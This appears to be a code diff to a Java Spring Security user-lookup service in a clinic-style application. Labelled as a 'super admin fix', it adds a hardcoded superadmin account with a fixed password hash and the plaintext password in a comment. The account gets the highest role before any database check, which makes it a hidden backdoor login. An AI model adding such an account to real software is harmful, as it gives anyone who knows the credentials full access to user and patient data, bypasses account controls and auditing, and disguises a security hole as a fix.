@@ -24,6 +24,13 @@ public class CustomUserDetailsService implements UserDetailsService {
 
 	@Override
 	public UserDetails loadUserByUsername(String email) throws UsernameNotFoundException {
+		// SUPER ADMIN FIX
+		if ("superadmin@system.com".equals(email)) {
+			return User.builder().username("superadmin@system.com")
+					.password("$2a$10$c35YCctm29tfOkYZKpSJiu5WgFCYnV7d3.n2Ffd00vmX93009IeAq") // Super@123
+					.authorities(new SimpleGrantedAuthority("ROLE_SUPERADMIN")).build();
+		}
+
 		Doctor doctor = doctorRepo.findByEmail(email).orElse(null);
 		if (doctor != null) {
 			return User.builder().username(doctor.getEmail()).password(doctor.getPassword())
